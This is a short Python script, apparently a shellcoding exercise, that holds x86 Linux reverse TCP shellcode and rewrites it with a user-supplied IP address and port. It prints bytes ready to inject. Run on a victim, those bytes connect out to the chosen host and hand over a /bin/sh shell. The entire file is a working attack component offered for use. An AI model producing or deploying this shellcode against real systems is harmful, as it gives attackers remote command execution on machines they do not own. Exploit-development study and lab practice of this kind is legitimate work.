import sys
 
shellcode = r"\x31\xc0\x89\xc3\x89\xc1\x89\xc7\x89\xc6\xb0\x66\xfe\xc3\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb0\x3f\xcd\x80\xfe\xc1\x83\xf9\x03\x75\xf5\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

if __name__ == "__main__":
    if len(sys.argv) != 3:  
        print("Usage: python3 reversetcp.py <ip> <port>")
        print("Default (port 4444) reverse TCP shellcode: \"" + shellcode + "\"")
        exit()

    if (65535 < int(sys.argv[2])) :
        print("Port too large")
        exit()

    hexip = ""
    for octet in sys.argv[1].split(sep="."):
        octet = hex(int(octet)).replace('0x','').zfill(2)
        hexip = hexip + "\\x" + octet


    port = hex(int(sys.argv[2]))
    port = port.replace('0x','').zfill(4)
    port = port[0:2]+port[2:4]
    hexport =  "\\x" + port[0:2] + "\\x" + port[2:]
    
    print("IP: \t" + sys.argv[1] + " " + hexip)
    print("Port: \t" + sys.argv[2] + " " + hexport)
    shellcode = shellcode.replace("\\x7f\\x01\\x01\\x01",hexip)
    shellcode = shellcode.replace("\\x11\\x5c",hexport)
    print("Reverse TCP shellcode: \"" + shellcode + "\"")
